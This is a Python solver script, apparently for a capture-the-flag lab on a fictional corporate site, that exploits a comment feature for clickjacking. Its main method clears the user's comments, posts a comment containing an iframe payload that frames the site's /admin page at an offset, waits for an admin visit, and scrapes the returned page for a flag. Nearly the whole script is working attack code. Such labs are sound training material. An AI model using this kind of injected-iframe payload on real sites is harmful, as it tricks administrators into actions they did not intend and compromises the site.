import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import time

# https://portswigger.net/web-security/clickjacking

BASE_URL = "https://layoffs.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    # https://layoffs.quoccacorp.com/js/comment.js
    def get_comment_js_code(self) -> str:
        response = self.session.get(f"{BASE_URL}/js/comment.js")
        return response.text

    def make_comment(self, content: str):
        return self.session.post(f"{BASE_URL}/api/comment", json={"content": content})

    def scrape_comment_ids(self) -> list[int]:
        from bs4 import BeautifulSoup
        response = self.session.get(BASE_URL)
        soup = BeautifulSoup(response.text, "html.parser")

        comment_id_elements = soup.find_all("a", class_=["delete", "reply", "view"], id=True)
        comment_ids = sorted(set(int(elem["id"]) for elem in comment_id_elements))
        return comment_ids

    def view_comment(self, comment_id: int):
        return self.session.get(f"{BASE_URL}/comment/{str(comment_id)}")

    def delete_comment(self, comment_id: int):
        return self.session.post(f"{BASE_URL}/api/comment/delete", json={"id": str(comment_id)})

    def delete_all_my_comments(self):
        for comment_id in self.scrape_comment_ids():
            self.delete_comment(comment_id)

    def main(self):
        self.delete_all_my_comments()

        ADMIN_MONITOR_WIDTH = 800
        ADMIN_MONITOR_HEIGHT = 600

        PAYLOAD = f'''<iframe
src="{BASE_URL}/admin"
width="{ADMIN_MONITOR_WIDTH}"
height="{ADMIN_MONITOR_HEIGHT}"

style="
position: absolute;
bottom: -235px;
right: 0;
"></iframe>'''

        self.make_comment(PAYLOAD)

        time.sleep(6)
        response = self.session.get(BASE_URL)
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()
